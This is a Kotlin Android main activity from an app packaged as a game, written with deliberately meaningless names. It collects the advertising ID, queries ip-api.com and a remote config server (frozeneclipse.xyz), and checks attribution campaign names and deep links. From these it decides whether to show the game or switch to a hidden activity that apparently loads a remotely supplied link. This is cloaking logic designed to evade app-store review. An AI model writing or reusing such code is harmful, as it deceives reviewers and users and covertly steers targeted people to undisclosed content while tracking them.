package com.pomelogames.bull

import android.content.Context
import android.content.Intent
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.facebook.applinks.AppLinkData
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.orhanobut.hawk.Hawk
import com.pomelogames.bull.StaatatrtttClass.Companion.C1ftgtgttg
import com.pomelogames.bull.StaatatrtttClass.Companion.DEEPLfrfrrf55fg
import com.pomelogames.bull.StaatatrtttClass.Companion.MAIN_IDdrfrrf8
import com.pomelogames.bull.StaatatrtttClass.Companion.appsCheckfrfrrf55
import com.pomelogames.bull.StaatatrtttClass.Companion.linkfrfrrf
import com.pomelogames.bull.databinding.ActivityMainBinding
import com.pomelogames.bull.gggggrfrfr.GaaamiActivity2
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.Job
import kotlinx.coroutines.launch
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity() {

    lateinit var ffofofo: ActivityMainBinding

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        ffofofo = ActivityMainBinding.inflate(layoutInflater)
        setContentView(ffofofo.root)

        dddefrrfrrf(this)
        GlobalScope.launch(Dispatchers.IO) {
            frgtgtgt
        }

        AppsFlyerLib.getInstance()
            .init("DZQw3ZeJAX8jwyr3GxvdDN", suuuuuuuuuukadefr, applicationContext)
        AppsFlyerLib.getInstance().start(this)

    }

    private suspend fun yhyoyhjy(): String? {
        val retrofitBuilder = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://pro.ip-api.com/")
            .build()
            .create(ApiInterfaceeeee::class.java)

        val gtjgitjt = retrofitBuilder.getData().body()?.gtgtt
        return gtjgitjt

    }

    private fun frgyktohkyk() {
        val fgttt = AdvertisingIdClient(applicationContext)
        fgttt.start()
        val gtgtgtgt = fgttt.info.id
        Hawk.put(MAIN_IDdrfrrf8, gtgtgtgt)
    }


    private suspend fun kilkpilkli(): String? {
        val retroBuildTwo = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://frozeneclipse.xyz/")
            .build()
            .create(ApiInterfaceeeee::class.java)

        val jujujjuju = retroBuildTwo.getDataDev().body()?.viewtgtttg
        val frfedfrrf = retroBuildTwo.getDataDev().body()?.appsCheckerrgttt
        Hawk.put(appsCheckfrfrrf55, frfedfrrf)
        Hawk.put(linkfrfrrf, jujujjuju)
        val hyjuijikiki = retroBuildTwo.getDataDev().body()?.dedeedee
        return hyjuijikiki
    }

    private val frgtgtgt: Job = GlobalScope.launch(Dispatchers.IO) {
        val gthy: String = yhyoyhjy().toString()
        val gtgtgtgt = kilkpilkli().toString()
        val ggttgtg: String? = Hawk.get(DEEPLfrfrrf55fg, "null")

        val lolomkk = Hawk.get(appsCheckfrfrrf55, "null")
        var naming: String? = Hawk.get(C1ftgtgttg)
        frgyktohkyk()
        if (lolomkk == "1") {
            val executorService = Executors.newSingleThreadScheduledExecutor()
            executorService.scheduleAtFixedRate({
                if (naming != null) {

                    if (naming!!.contains("tdb2") || gtgtgtgt.contains(gthy) || ggttgtg!!.contains("tdb2")) {
                        executorService.shutdown()
                        startActivity(Intent(this@MainActivity, VibibibibActivity::class.java))
                        finish()
                    } else {
                        executorService.shutdown()
                        startActivity(Intent(this@MainActivity, GaaamiActivity2::class.java))
                        finish()
                    }
                } else {
                    naming = Hawk.get(C1ftgtgttg)
                }

            }, 0, 2, TimeUnit.SECONDS)
        } else if (gtgtgtgt.contains(gthy)) {
            startActivity(Intent(this@MainActivity, VibibibibActivity::class.java))
            finish()
        } else {
            startActivity(Intent(this@MainActivity, GaaamiActivity2::class.java))
            finish()
        }
    }

    fun dddefrrfrrf(context: Context) {
        AppLinkData.fetchDeferredAppLinkData(
            context
        ) { appLinkData: AppLinkData? ->
            appLinkData?.let {
                val papapapa = appLinkData.targetUri.host.toString()
                Hawk.put(DEEPLfrfrrf55fg, papapapa)
            }
            if (appLinkData == null) {

            }
        }
    }

    private val suuuuuuuuuukadefr = object : AppsFlyerConversionListener {
        override fun onConversionDataSuccess(data: MutableMap<String, Any>?) {
            val dataGotten = data?.get("campaign").toString()
            Hawk.put(C1ftgtgttg, dataGotten)
        }

        override fun onConversionDataFail(p0: String?) {

        }

        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {

        }

        override fun onAttributionFailure(p0: String?) {
        }
    }


}


